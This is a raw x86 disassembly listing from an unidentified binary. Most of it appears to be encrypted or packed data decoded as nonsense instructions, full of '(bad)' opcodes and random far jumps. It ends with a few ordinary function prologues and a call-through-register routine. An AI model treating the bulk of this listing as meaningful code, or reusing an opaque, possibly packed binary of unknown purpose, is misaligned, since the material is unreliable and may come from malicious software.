  416272:	sbb    dh,BYTE PTR [edi+ebp*1+0x26]
  416276:	dec    esi
  416277:	pop    ss
  416278:	cwde   
  416279:	sti    
  41627a:	cwde   
  41627b:	adc    DWORD PTR [edx],ebp
  41627d:	inc    edi
  41627e:	pop    edi
  41627f:	mov    esi,0x9a044752
  416284:	fidiv  DWORD PTR [esi]
  416286:	je     0x416304
  416288:	pushf  
  416289:	jae    0x416224
  41628b:	mov    dh,0x3a
  41628d:	jmp    0x416279
  41628f:	push   edi
  416290:	mov    ecx,0xa8bdde8f
  416295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416296:	mov    al,BYTE PTR [ebp+eax*8-0x5e0c0db]
  41629d:	xor    DWORD PTR [eax+0x5fc612b5],ebx
  4162a3:	pop    ecx
  4162a4:	cmp    DWORD PTR [ebp-0x2],edi
  4162a7:	in     eax,0x5
  4162a9:	or     eax,DWORD PTR [esi-0x6980943e]
  4162af:	mov    eax,ds:0xf6edb72e
  4162b4:	jl     0x416297
  4162b6:	push   es
  4162b7:	rol    BYTE PTR [ecx+ebp*1+0x7a3c25f4],1
  4162be:	pusha  
  4162bf:	or     eax,0x6f8317eb
  4162c4:	push   esi
  4162c5:	fst    st(4)
  4162c7:	ret    
  4162c8:	xchg   BYTE PTR [ecx+0x6],dl
  4162cb:	imul   ebx,DWORD PTR [ebx+0x68],0xffffffdd
  4162cf:	push   ds
  4162d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162d1:	in     eax,dx
  4162d2:	sub    eax,0x2ee67b03
  4162d7:	adc    BYTE PTR ds:0x1d8141cd,dh
  4162dd:	daa    
  4162de:	jp     0x416279
  4162e0:	aas    
  4162e1:	gs xchg ebp,eax
  4162e3:	and    ebp,DWORD PTR [edi+0x4a]
  4162e6:	jae    0x41626b
  4162e8:	push   esi
  4162e9:	aad    0x8b
  4162eb:	pop    es
  4162ec:	sub    al,0xfd
  4162ee:	dec    ecx
  4162ef:	mov    cl,0x45
  4162f1:	cmp    BYTE PTR [ebx],0xdf
  4162f4:	sti    
  4162f5:	and    DWORD PTR ds:0xf405e20f,eax
  4162fb:	popa   
  4162fc:	cld    
  4162fd:	sti    
  4162fe:	cmp    al,0x26
  416300:	push   ecx
  416301:	sbb    al,0x2a
  416303:	or     BYTE PTR [edx+eiz*2],cl
  416306:	xchg   ebp,eax
  416307:	ins    BYTE PTR es:[edi],dx
  416308:	mov    ebp,0x82b2ccc2
  41630d:	xor    al,0xd4
  41630f:	out    dx,eax
  416310:	cmp    DWORD PTR [eax-0x2dc40f7b],esi
  416316:	enter  0xfeb1,0xf1
  41631a:	xchg   DWORD PTR [ecx],esi
  41631c:	mov    DWORD PTR [ebp+0x33],eax
  41631f:	jp     0x416392
  416321:	and    DWORD PTR [edx],0xffffffbe
  416324:	popf   
  416325:	scas   eax,DWORD PTR es:[edi]
  416326:	es jecxz 0x416324
  416329:	lea    ebx,[edx-0x3049129e]
  41632f:	xchg   esi,eax
  416330:	jl     0x416341
  416332:	push   esi
  416333:	sbb    bh,BYTE PTR [ecx-0x32]
  416336:	sbb    BYTE PTR [ecx+0x17ed613e],al
  41633c:	sbb    BYTE PTR [edx+0x6a0a8834],bl
  416342:	sahf   
  416343:	mov    al,0x3f
  416345:	and    bl,BYTE PTR [ecx]
  416347:	pop    ebx
  416348:	and    bh,BYTE PTR [eax+0x61730f68]
  41634e:	pop    edi
  41634f:	jge    0x4162ec
  416351:	mov    bl,0x99
  416353:	pop    ebp
  416354:	lods   al,BYTE PTR ds:[esi]
  416355:	ds dec ebx
  416357:	mul    DWORD PTR [edx+0x46365b2]
  41635d:	jbe    0x416352
  41635f:	(bad)  
  416360:	out    0x90,eax
  416362:	cdq    
  416363:	mov    ah,0xdb
  416365:	icebp  
  416366:	mov    edx,0xd7ecbbd9
  41636b:	in     eax,0xcc
  41636d:	xor    cl,al
  41636f:	add    ecx,DWORD PTR ds:0xdd563892
  416375:	rol    dl,0x96
  416378:	shl    BYTE PTR [eax-0x14c3b7b1],1
  41637e:	lea    eax,[edx*1+0x8570e55]
  416385:	cmp    cl,BYTE PTR [eax]
  416387:	leavew 
  416389:	popf   
  41638a:	outs   dx,BYTE PTR ds:[esi]
  41638b:	pop    ebx
  41638c:	iret   
  41638d:	sbb    eax,0xb44f73ed
  416392:	test   BYTE PTR [ebp-0x471b51c8],bl
  416398:	jo     0x4163c3
  41639a:	or     ebp,0xf7e91c58
  4163a0:	push   ds
  4163a1:	ret    0x477e
  4163a4:	mov    cl,0xe4
  4163a6:	leave  
  4163a7:	pushf  
  4163a8:	xchg   BYTE PTR [eax],al
  4163aa:	cmp    DWORD PTR [edx+eax*1+0x1b],ecx
  4163ae:	mov    bh,0x2a
  4163b0:	cmp    al,0x2f
  4163b2:	out    dx,al
  4163b3:	inc    esi
  4163b4:	fcomp  QWORD PTR [eax]
  4163b6:	mov    WORD PTR [edx+0x2befe2ed],?
  4163bc:	out    0x7f,eax
  4163be:	out    dx,eax
  4163bf:	pop    eax
  4163c0:	push   ebp
  4163c1:	xchg   ebp,eax
  4163c2:	cmp    bl,BYTE PTR [esi]
  4163c4:	xor    ebp,DWORD PTR [edx]
  4163c6:	addr16 push cs
  4163c8:	loope  0x4163db
  4163ca:	cmp    eax,0xeea883fa
  4163cf:	xchg   ebp,eax
  4163d0:	lods   al,BYTE PTR ds:[esi]
  4163d1:	jecxz  0x4163ca
  4163d3:	pop    esi
  4163d4:	mov    esi,0xdcff0142
  4163d9:	paddw  mm4,QWORD PTR [edx+0x6a0ac145]
  4163e0:	dec    ecx
  4163e1:	loopne 0x4163a1
  4163e3:	push   esi
  4163e4:	pop    es
  4163e5:	in     al,dx
  4163e6:	shr    BYTE PTR [ecx-0x19],0x3
  4163ea:	lods   eax,DWORD PTR ds:[esi]
  4163eb:	dec    esp
  4163ec:	mov    dh,0xdf
  4163ee:	cmp    eax,0x130c6ca2
  4163f3:	or     al,0xd4
  4163f5:	mov    ds:0x1c78578d,eax
  4163fa:	and    BYTE PTR [edx-0x67],bh
  4163fd:	cmp    edx,DWORD PTR [esi*8-0x1e896b4b]
  416404:	jmp    0xf371:0xf9a0d6b6
  41640b:	dec    ecx
  41640c:	jb     0x41646f
  41640e:	or     al,0x2e
  416410:	cwde   
  416411:	data16 cmc 
  416413:	hlt    
  416414:	lahf   
  416415:	out    dx,al
  416416:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416417:	mov    cl,0xc4
  416419:	lea    esp,[edi+ebx*4]
  41641c:	jo     0x416425
  41641e:	sub    al,dh
  416420:	adc    edi,DWORD PTR [edi+0x37]
  416423:	dec    ebx
  416425:	(bad)  
  416426:	fwait
  416427:	loope  0x4164a3
  416429:	mov    dh,0x91
  41642b:	sbb    BYTE PTR [edi+0x6676c9a0],al
  416431:	mov    cl,0x11
  416433:	mov    ebx,0xcb7ee1f2
  416438:	jmp    0x36bb26a7
  41643d:	neg    BYTE PTR [ebp-0x7f775a18]
  416443:	dec    ebp
  416444:	ret    
  416445:	fsub   DWORD PTR [edi-0x1]
  416448:	sub    eax,0x59875e24
  41644d:	ins    BYTE PTR es:[edi],dx
  41644e:	psubb  mm4,QWORD PTR ds:0xa9ac734b
  416455:	sbb    ch,BYTE PTR [esi]
  416457:	add    cl,bl
  416459:	aas    
  41645a:	cwde   
  41645b:	dec    esi
  41645c:	jno    0x416491
  41645e:	pop    ebp
  41645f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416460:	dec    edi
  416461:	imul   esp,ebx,0xdb8f9e01
  416467:	add    edi,DWORD PTR [ecx-0x6c9539af]
  41646d:	cwde   
  41646e:	cmp    edi,DWORD PTR [ebx]
  416470:	(bad)  
  416471:	pop    ebp
  416472:	dec    eax
  416473:	ror    bh,1
  416475:	mov    ecx,0x7574f603
  41647a:	loopne 0x4164a7
  41647c:	mov    al,0xdb
  41647e:	ret    
  41647f:	mov    ch,0xe3
  416481:	xor    al,0xc2
  416483:	jae    0x4164ca
  416485:	xor    BYTE PTR [edx-0x4acd1077],bl
  41648b:	pop    edi
  41648c:	hlt    
  41648d:	jb     0x4164dc
  41648f:	cmp    edx,DWORD PTR [ebx+0x7749655f]
  416495:	test   al,0xb7
  416497:	push   edi
  416498:	js     0x4164c4
  41649a:	popa   
  41649b:	adc    DWORD PTR [ebx+0x7f85ccd2],eax
  4164a1:	xlat   BYTE PTR ds:[ebx]
  4164a2:	add    DWORD PTR [ebx+eax*4],ebp
  4164a5:	cdq    
  4164a6:	jge    0x41651e
  4164a8:	ds jae 0x41647b
  4164ab:	add    edx,esi
  4164ad:	dec    esi
  4164ae:	out    0x7d,eax
  4164b0:	xor    BYTE PTR [eax],ah
  4164b2:	inc    eax
  4164b3:	mov    edi,0xda7fc822
  4164b8:	xlat   BYTE PTR ds:[ebx]
  4164b9:	jne    0x4164e2
  4164bb:	enter  0x475d,0x36
  4164bf:	push   es
  4164c0:	outs   dx,DWORD PTR ds:[esi]
  4164c1:	pop    es
  4164c2:	cmp    dl,al
  4164c4:	xchg   DWORD PTR [edx],edx
  4164c6:	test   al,0xe7
  4164c8:	pop    ds
  4164c9:	pop    edx
  4164ca:	inc    edi
  4164cb:	pusha  
  4164cc:	inc    ecx
  4164cd:	jo     0x4164ca
  4164cf:	fisubr DWORD PTR [esi+ecx*4]
  4164d2:	mov    ebx,0xa86547ab
  4164d7:	jo     0x41645c
  4164d9:	shl    BYTE PTR [ecx+0x14dcfa28],0xbf
  4164e0:	add    eax,0xba808aee
  4164e5:	sar    bl,cl
  4164e7:	sub    BYTE PTR [ebp-0x3f],dh
  4164ea:	mov    al,bl
  4164ec:	lds    esi,FWORD PTR [esp+edx*4-0x735901d3]
  4164f3:	xor    DWORD PTR [esi+edi*1],0xfffffff9
  4164f7:	ins    BYTE PTR es:[edi],dx
  4164f8:	cmp    al,0x2
  4164fa:	pop    ss
  4164fb:	xor    ch,BYTE PTR [edi+edx*4-0x2121948a]
  416502:	and    al,0x6f
  416504:	mov    al,0x99
  416506:	push   ss
  416507:	sti    
  416508:	xchg   ebx,eax
  416509:	pop    ebp
  41650a:	test   ch,ah
  41650c:	ficom  DWORD PTR [eax+0x7cea724f]
  416512:	sub    al,0x8c
  416514:	test   ebx,eax
  416516:	push   0x12d9a9a5
  41651b:	cdq    
  41651c:	scas   eax,DWORD PTR es:[edi]
  41651d:	int3   
  41651e:	shr    BYTE PTR [ecx-0x140ac7d1],0x88
  416525:	ret    
  416526:	cmp    eax,0x423d9184
  41652b:	adc    eax,0xfe9545db
  416530:	stos   DWORD PTR es:[edi],eax
  416531:	inc    edi
  416532:	inc    ebx
  416533:	push   esp
  416534:	cli    
  416535:	into   
  416536:	push   eax
  416537:	cld    
  416538:	(bad)  
  416539:	fsubrp st(7),st
  41653b:	in     eax,0x2e
  41653d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41653e:	jmp    DWORD PTR [esi+eiz*4-0x2a]
  416542:	nop
  416543:	call   0xddd4:0xc0847977
  41654a:	gs stc 
  41654c:	test   BYTE PTR [edi+ecx*1+0x28],dh
  416550:	cdq    
  416551:	in     al,dx
  416552:	cmp    DWORD PTR [eax],esp
  416554:	outs   dx,DWORD PTR ds:[esi]
  416555:	jbe    0x41651d
  416557:	pop    esi
  416558:	scas   eax,DWORD PTR es:[edi]
  416559:	mul    DWORD PTR [ebp+0x62]
  41655c:	push   cs
  41655d:	call   0x9589:0xb6dd40b7
  416564:	push   0xffffffd0
  416566:	and    al,dl
  416568:	cmp    al,0x77
  41656a:	sub    al,BYTE PTR [ecx+0x2c0d4908]
  416570:	cmp    BYTE PTR [edx+0x44d80e20],bh
  416576:	mov    edx,0xd3d9b6d
  41657b:	mov    ebx,DWORD PTR [ebx+0x46]
  41657e:	jmp    0x8416:0x32e5d732
  416585:	imul   DWORD PTR [edx+esi*4]
  416588:	sbb    edx,ebp
  41658a:	cmp    BYTE PTR [edx-0x2],ch
  41658d:	(bad)  
  41658e:	(bad)  
  41658f:	cdq    
  416590:	out    0xdf,eax
  416592:	ss inc edx
  416594:	pop    edx
  416595:	dec    edi
  416596:	mov    ch,0xe8
  416598:	out    0x45,eax
  41659a:	push   esi
  41659b:	xchg   esi,eax
  41659c:	mov    esi,0x8832e530
  4165a1:	mov    dh,dh
  4165a3:	dec    ebp
  4165a4:	xlat   BYTE PTR ds:[ebx]
  4165a5:	in     eax,0xdd
  4165a7:	fiadd  DWORD PTR [edx+esi*4]
  4165aa:	jecxz  0x416539
  4165ac:	fadd   QWORD PTR [esi-0x67]
  4165af:	mov    bh,0xf0
  4165b1:	(bad)  
  4165b2:	ja     0x416591
  4165b4:	rol    DWORD PTR [edi-0x25],cl
  4165b7:	lds    ebp,FWORD PTR [esp+ebp*1]
  4165ba:	dec    ebp
  4165bb:	sbb    DWORD PTR [edi-0x5606e8b3],ebp
  4165c1:	lods   eax,DWORD PTR ds:[esi]
  4165c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165c3:	adc    al,0x98
  4165c5:	sbb    al,BYTE PTR [ecx-0x5f3840a9]
  4165cb:	mov    edi,0xbf0b2af0
  4165d0:	test   al,0x55
  4165d2:	aas    
  4165d3:	jle    0x41661b
  4165d5:	push   esp
  4165d6:	jo     0x4165e9
  4165d8:	(bad)  
  4165d9:	cwde   
  4165da:	jmp    0xc335c884
  4165df:	iret   
  4165e0:	push   esp
  4165e1:	test   BYTE PTR [ebx+0x25],cl
  4165e4:	and    ch,ah
  4165e6:	scas   eax,DWORD PTR es:[edi]
  4165e7:	cmp    bl,cl
  4165e9:	jle    0x4165b6
  4165eb:	fnsave [esi-0x9]
  4165ee:	shr    BYTE PTR [eax-0x79427710],cl
  4165f4:	(bad)  
  4165f5:	inc    edi
  4165f6:	iret   
  4165f7:	xchg   ecx,eax
  4165f8:	test   BYTE PTR [edi-0x7b55b54d],ch
  4165fe:	fcmovb st,st(6)
  416600:	mov    al,ds:0xebaad2c6
  416605:	inc    edx
  416606:	and    al,0x50
  416608:	(bad)  
  416609:	out    dx,al
  41660a:	ja     0x416631
  41660c:	pop    ebp
  41660d:	push   0x47
  41660f:	stos   DWORD PTR es:[edi],eax
  416610:	mov    esi,0x31d5e351
  416615:	or     eax,0x949aee13
  41661a:	stos   DWORD PTR es:[edi],eax
  41661b:	outs   dx,DWORD PTR ds:[esi]
  41661c:	pusha  
  41661d:	pop    ebx
  41661e:	pop    edi
  41661f:	sbb    BYTE PTR [ebx+0x77],0x35
  416623:	pop    es
  416624:	jl     0x416658
  416626:	inc    edx
  416627:	xchg   BYTE PTR [ebp-0x22],al
  41662a:	(bad)  
  41662b:	cs jne 0x416650
  41662e:	pop    edx
  41662f:	mov    edi,0x67a5ce35
  416634:	lahf   
  416635:	sbb    dh,bh
  416637:	les    edi,FWORD PTR [ebx-0x33]
  41663a:	mov    ah,0x1e
  41663c:	jmp    0x416660
  41663e:	nop
  41663f:	test   BYTE PTR [eax+ebp*4],al
  416642:	sti    
  416643:	not    edx
  416645:	ficomp WORD PTR [ebx-0x78cbdd64]
  41664b:	pop    ds
  41664c:	dec    ecx
  41664d:	(bad)  
  41664e:	and    eax,0xb10a9bf1
  416653:	popa   
  416654:	aad    0xe1
  416656:	cli    
  416657:	mov    cl,0x55
  416659:	or     ebp,ebx
  41665b:	mov    eax,DWORD PTR [ecx]
  41665d:	push   eax
  41665e:	(bad)  
  41665f:	and    esp,DWORD PTR [esi+eiz*4]
  416662:	out    0x48,al
  416664:	cmp    esi,ebp
  416666:	mov    esp,0xe45d0ad8
  41666b:	push   ebp
  41666c:	stos   DWORD PTR es:[edi],eax
  41666d:	mov    al,ds:0xb7d47daf
  416672:	xor    al,0xef
  416674:	fidivr WORD PTR [ebx]
  416676:	clc    
  416677:	dec    ebp
  416678:	mov    al,ds:0x8e67bcf0
  41667d:	sub    DWORD PTR [ecx+edi*4-0x29ef432d],ebx
  416684:	(bad)  
  416685:	push   ebp
  416686:	retf   0x2feb
  416689:	mov    ecx,DWORD PTR [ebp+0x5c]
  41668c:	sbb    esi,DWORD PTR [esi+0x474aa4d3]
  416692:	cwde   
  416693:	in     al,0x86
  416695:	or     ecx,esi
  416697:	ins    DWORD PTR es:[edi],dx
  416698:	test   al,0x36
  41669a:	sub    DWORD PTR [edx-0x6dd5b94c],ebx
  4166a0:	mov    cl,0x5b
  4166a2:	in     eax,0x30
  4166a4:	cli    
  4166a5:	pop    ds
  4166a6:	or     al,0xcc
  4166a8:	jae    0x416641
  4166aa:	push   edi
  4166ab:	fsubr  st,st(6)
  4166ad:	add    al,BYTE PTR [edi]
  4166af:	or     al,0x48
  4166b1:	inc    edi
  4166b2:	mov    DWORD PTR [edx-0x12259ace],ecx
  4166b8:	pop    esi
  4166b9:	pop    es
  4166ba:	or     al,cl
  4166bc:	(bad)  
  4166bd:	in     al,dx
  4166be:	lds    ecx,FWORD PTR [edx+0x1a]
  4166c1:	rol    DWORD PTR [ebx+0x28],0x96
  4166c5:	(bad)  [edi-0x7df9bf46]
  4166cb:	jnp    0x41665a
  4166cd:	adc    al,0x5d
  4166cf:	jp     0x416659
  4166d1:	cmc    
  4166d2:	cmp    DWORD PTR [esi],eax
  4166d4:	jne    0x4166b7
  4166d6:	int3   
  4166d7:	imul   edi,ebp,0x70ee0975
  4166dd:	sbb    eax,0x295cff51
  4166e2:	imul   ebp,DWORD PTR [edx+0x14],0xffffffca
  4166e6:	sti    
  4166e7:	mov    edi,0xc23b98a4
  4166ec:	add    al,0xc1
  4166ee:	push   es
  4166ef:	push   eax
  4166f0:	jb     0x4166ed
  4166f2:	sbb    ebx,edx
  4166f4:	aaa    
  4166f5:	sbb    BYTE PTR [eax],dh
  4166f7:	jmp    0xe271:0xbc9e3bc1
  4166fe:	ret    
  4166ff:	and    eax,0x4859c568
  416704:	mov    dh,cl
  416706:	repnz popa 
  416708:	sub    dh,BYTE PTR [ebx-0x3d9e053e]
  41670e:	popf   
  41670f:	push   esi
  416710:	fcmovu st,st(5)
  416712:	or     esi,esp
  416714:	xadd   DWORD PTR [ecx+0x19c8d3f1],ecx
  41671b:	mov    ebp,0xc46eac4f
  416720:	mov    ecx,0xbc4241f6
  416725:	xor    bh,al
  416727:	push   cs
  416728:	and    BYTE PTR [eax+0x6d12c7f1],0xac
  41672f:	pop    ebx
  416730:	xchg   ebp,eax
  416731:	aad    0xd2
  416733:	or     al,0x34
  416735:	das    
  416736:	in     eax,dx
  416737:	jae    0x416778
  416739:	and    ah,BYTE PTR [edi+0x781cf5e]
  41673f:	cs scas al,BYTE PTR es:[edi]
  416741:	or     dl,BYTE PTR [ebx+0x407518c9]
  416747:	cmp    dl,BYTE PTR [edi-0x2308cc92]
  41674d:	xchg   edi,eax
  41674e:	mul    esi
  416750:	cmp    eax,0x724bd392
  416755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416756:	popa   
  416757:	enter  0x56a1,0xe
  41675b:	mov    esi,0xf49bda70
  416760:	jle    0x41674a
  416762:	(bad)  
  416763:	pop    ds
  416764:	or     bh,dl
  416766:	bound  ecx,QWORD PTR [edx+0x5]
  416769:	cld    
  41676a:	addr16 mov gs:0xacd9,al
  41676f:	dec    ebx
  416770:	adc    ebp,DWORD PTR [edi+0x34]
  416773:	ror    edi,0xbd
  416776:	mov    esp,DWORD PTR [esi-0x4ddd3d65]
  41677c:	ins    BYTE PTR es:[edi],dx
  41677d:	loope  0x4167bd
  41677f:	outs   dx,DWORD PTR ds:[esi]
  416780:	repnz lock (bad) 
  416783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416784:	cmp    al,bl
  416786:	dec    edi
  416787:	xor    al,0xda
  416789:	outs   dx,DWORD PTR ds:[esi]
  41678a:	pop    ebx
  41678b:	stos   BYTE PTR es:[edi],al
  41678c:	scas   al,BYTE PTR es:[edi]
  41678d:	je     0x41675a
  41678f:	inc    esp
  416790:	pop    edi
  416791:	rcr    edx,cl
  416793:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416795:	add    eax,0xaf0b79d1
  41679a:	sar    BYTE PTR [eax+0x5a21660d],1
  4167a0:	pop    edx
  4167a1:	pushf  
  4167a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167a3:	shl    BYTE PTR [esi+eax*1+0x31],1
  4167a7:	out    dx,eax
  4167a8:	test   al,0xb5
  4167aa:	push   esi
  4167ab:	jne    0x416748
  4167ad:	dec    ecx
  4167ae:	ss sti 
  4167b0:	adc    al,al
  4167b2:	imul   BYTE PTR [ebp+0x11377d51]
  4167b8:	adc    al,0x1d
  4167ba:	adc    BYTE PTR [ebx+0x2c],bl
  4167bd:	out    0x2c,al
  4167bf:	mov    edi,0x7a3729a4
  4167c4:	or     eax,0xbe71acb1
  4167c9:	xor    BYTE PTR [eax+0x53],cl
  4167cc:	add    esp,esp
  4167ce:	push   es
  4167cf:	or     al,0xfa
  4167d1:	clc    
  4167d2:	mov    ds:0xe8530cc1,eax
  4167d7:	call   0x1b992465
  4167dc:	repnz push edx
  4167de:	push   ds
  4167df:	xchg   ebp,eax
  4167e0:	pop    edi
  4167e1:	push   cs
  4167e2:	or     dh,BYTE PTR [ebp+eax*2+0x62315d16]
  4167e9:	shl    DWORD PTR [esi],1
  4167eb:	mov    BYTE PTR [edx],ah
  4167ed:	inc    esp
  4167ee:	daa    
  4167ef:	add    dl,BYTE PTR [eax+0x16661ea0]
  4167f5:	(bad)  
  4167f7:	sub    al,0x72
  4167f9:	pusha  
  4167fa:	fisttp WORD PTR [ecx]
  4167fc:	not    BYTE PTR [edi]
  4167fe:	sbb    bh,BYTE PTR [eax-0xd29cb9a]
  416804:	or     bh,BYTE PTR [edi]
  416806:	adc    dh,BYTE PTR [ebp+0x3c]
  416809:	or     ebp,ebx
  41680b:	and    BYTE PTR [eax],bl
  41680d:	jp     0x416862
  41680f:	mov    edi,0x4bf4c73c
  416814:	aas    
  416815:	or     ebp,esi
  416817:	enter  0x5d98,0xbf
  41681b:	loop   0x4167f5
  41681d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41681e:	push   edi
  41681f:	pop    ebx
  416820:	inc    edx
  416821:	mov    ds:0x32691c54,al
  416826:	int3   
  416827:	jne    0x41687a
  416829:	push   ss
  41682a:	call   0xe4d01ed9
  41682f:	mov    BYTE PTR [ebx+0x74c26a6b],cl
  416835:	push   edi
  416836:	in     al,0x7c
  416838:	mov    ebx,0x8984a179
  41683d:	inc    ecx
  41683e:	jnp    0x4168a3
  416840:	fwait
  416841:	xchg   ebp,eax
  416842:	es sti 
  416844:	jne    0x4168a0
  416846:	jnp    0x416829
  416848:	sub    DWORD PTR [eax+0x5e],esp
  41684b:	out    dx,eax
  41684c:	repz test DWORD PTR [eax+0x65],esp
  416850:	stos   DWORD PTR es:[edi],eax
  416851:	inc    ecx
  416852:	loopne 0x4168d1
  416854:	mov    dh,0x2e
  416856:	dec    edi
  416857:	pop    ebp
  416858:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416859:	lods   eax,DWORD PTR ds:[esi]
  41685a:	out    0x36,eax
  41685c:	cmp    eax,0x98922994
  416861:	adc    eax,0x97fc8049
  416866:	inc    ebp
  416867:	pop    esp
  416868:	ins    DWORD PTR es:[edi],dx
  416869:	ja     0x4168e8
  41686b:	or     DWORD PTR [edx],ebx
  41686d:	fidiv  WORD PTR [edx]
  41686f:	xchg   ebx,eax
  416870:	and    eax,DWORD PTR [ecx-0x58]
  416873:	ret    0xe902
  416876:	aaa    
  416877:	out    0x33,al
  416879:	and    DWORD PTR [ecx+eax*2],eax
  41687c:	(bad)  [ebx]
  41687e:	sahf   
  41687f:	lock push ebx
  416881:	push   cs
  416882:	jne    0x41680f
  416884:	imul   ecx,DWORD PTR [edi+0x31],0xefdbcc79
  41688b:	pop    edx
  41688c:	loopne 0x416858
  41688e:	mov    dh,0x28
  416890:	jle    0x41681f
  416892:	jne    0x4168f0
  416894:	jo     0x416861
  416896:	jnp    0x416825
  416898:	jne    0x4168ba
  41689a:	scas   eax,DWORD PTR es:[edi]
  41689b:	je     0x41683f
  41689d:	sbb    al,0x1f
  41689f:	pop    eax
  4168a0:	xchg   esi,eax
  4168a1:	sub    DWORD PTR [eax-0x38],0x74
  4168a5:	mov    ds:0x975cf33b,eax
  4168aa:	cdq    
  4168ab:	push   es
  4168ac:	mov    al,ds:0xf971753c
  4168b1:	popa   
  4168b2:	dec    ecx
  4168b3:	in     eax,0x28
  4168b5:	mov    ds:0xb5288441,al
  4168ba:	scas   al,BYTE PTR es:[edi]
  4168bb:	retf   
  4168bc:	lahf   
  4168bd:	cmp    eax,0xe67d55d5
  4168c2:	mov    dl,0x12
  4168c4:	sbb    BYTE PTR [edx-0x63cb13c4],0x7f
  4168cb:	or     eax,0xb1ffb66
  4168d0:	retf   
  4168d1:	add    ecx,eax
  4168d3:	daa    
  4168d4:	ror    edi,1
  4168d6:	adc    BYTE PTR [ecx],0x7a
  4168d9:	pushf  
  4168da:	js     0x41691a
  4168dc:	aam    0x8a
  4168de:	jmp    0xa648:0xe23c6593
  4168e5:	xchg   edi,eax
  4168e6:	xchg   ebx,eax
  4168e7:	pop    edx
  4168e8:	in     al,dx
  4168e9:	push   cs
  4168ea:	(bad)  
  4168eb:	iret   
  4168ec:	mov    bl,0x99
  4168ee:	sar    BYTE PTR [esi],cl
  4168f0:	mov    BYTE PTR cs:[si-0x21],bh
  4168f5:	jbe    0x416963
  4168f7:	jecxz  0x416935
  4168f9:	sbb    BYTE PTR [esi-0x65],0x6a
  4168fd:	sbb    edi,edi
  4168ff:	div    BYTE PTR [edx]
  416901:	out    dx,al
  416902:	ja     0x416892
  416904:	clc    
  416905:	test   BYTE PTR [ebx-0x67],bh
  416908:	inc    esi
  416909:	fdivr  QWORD PTR [edi+0x7b2c13e]
  41690f:	pop    ds
  416910:	rcr    bl,0x65
  416913:	cs push ecx
  416915:	cs cld 
  416917:	loop   0x416977
  416919:	mov    ds:0xe241e8b7,al
  41691e:	pop    ebp
  41691f:	cmp    BYTE PTR [ecx+0x95971ce],ch
  416925:	sub    ah,dh
  416927:	sbb    BYTE PTR [ecx],ah
  416929:	retf   0x304c
  41692c:	jae    0x416926
  41692e:	sub    bl,BYTE PTR [esi]
  416930:	adc    al,0x68
  416932:	inc    edi
  416933:	aas    
  416934:	sbb    al,0x49
  416936:	aam    0x71
  416938:	jne    0x416944
  41693a:	push   0x440095f1
  41693f:	in     eax,dx
  416940:	push   ebx
  416941:	add    dh,bh
  416943:	mov    eax,DWORD PTR [edx]
  416945:	adc    esp,DWORD PTR [edi+0x49]
  416948:	xchg   esi,eax
  416949:	pop    ebp
  41694a:	dec    edx
  41694b:	int    0x41
  41694d:	out    0xe6,al
  41694f:	imul   ebx,DWORD PTR [edx],0x7c203cc5
  416955:	call   0xe3f37c2c
  41695a:	jmp    0xb67624bd
  41695f:	cmp    al,0xf4
  416961:	sbb    bh,ah
  416963:	call   0x8ab7:0xd33a3cec
  41696a:	sub    dh,BYTE PTR [edx+0x779193ca]
  416970:	es clc 
  416972:	arpl   WORD PTR ds:0x3303dad6,cx
  416978:	and    al,0x98
  41697a:	push   ebx
  41697b:	(bad)  
  41697c:	pop    edx
  41697d:	out    0xeb,al
  41697f:	sbb    al,0xd8
  416981:	stos   DWORD PTR es:[edi],eax
  416982:	cmp    al,0x96
  416984:	jnp    0x416991
  416986:	adc    cl,BYTE PTR [ebp+0x6eedbd33]
  41698c:	pop    ds
  41698d:	std    
  41698e:	jo     0x41691b
  416990:	jne    0x41698e
  416992:	call   esi
  416994:	mov    DWORD PTR [ebp-0x38],eax
  416997:	cmp    DWORD PTR [ebp-0x38],0x57
  41699b:	jne    0x4169a9
  41699d:	mov    edx,DWORD PTR [ebp-0x20]
  4169a0:	push   edx
  4169a1:	call   0x401000
  4169a6:	add    esp,0x4
  4169a9:	xor    eax,eax
  4169ab:	pop    esi
  4169ac:	mov    esp,ebp
  4169ae:	pop    ebp
  4169af:	ret    
  4169b0:	push   ebp
  4169b1:	mov    ebp,esp
  4169b3:	sub    esp,0x124
  4169b9:	xor    eax,eax
  4169bb:	mov    esp,ebp
  4169bd:	pop    ebp
  4169be:	ret    
  4169bf:	push   ebp
  4169c0:	mov    ebp,esp
  4169c2:	sub    esp,0x2c
  4169c5:	push   ebx
  4169c6:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4169cd:	mov    DWORD PTR [ebp-0xc],0x0
  4169d4:	mov    DWORD PTR [ebp-0x20],0x1
  4169db:	mov    DWORD PTR [ebp-0x10],0x0
  4169e2:	mov    eax,DWORD PTR [ebp+0xc]
  4169e5:	mov    DWORD PTR [ebp-0x1c],eax
  4169e8:	mov    DWORD PTR [ebp-0x18],0x0
  4169ef:	mov    DWORD PTR [ebp-0x8],0x0
  4169f6:	mov    DWORD PTR [ebp-0x24],0x0
  4169fd:	mov    ecx,DWORD PTR [ebp-0x4]
  416a00:	sub    ecx,0x1
  416a03:	mov    DWORD PTR [ebp-0x4],ecx
  416a06:	mov    edx,DWORD PTR [ebp+0x8]
  416a09:	mov    DWORD PTR [ebp-0x10],edx
  416a0c:	mov    DWORD PTR [ebp-0x28],0x1
  416a13:	mov    eax,DWORD PTR [ebp-0x4]
  416a16:	add    eax,0x2
  416a19:	mov    DWORD PTR [ebp-0x4],eax
  416a1c:	mov    ecx,DWORD PTR [ebp-0x1c]
  416a1f:	add    ecx,DWORD PTR [ebp-0x4]
  416a22:	mov    dl,BYTE PTR [ecx+0x1]
  416a25:	mov    BYTE PTR [ebp-0x11],dl
  416a28:	mov    eax,DWORD PTR [ebp-0x4]
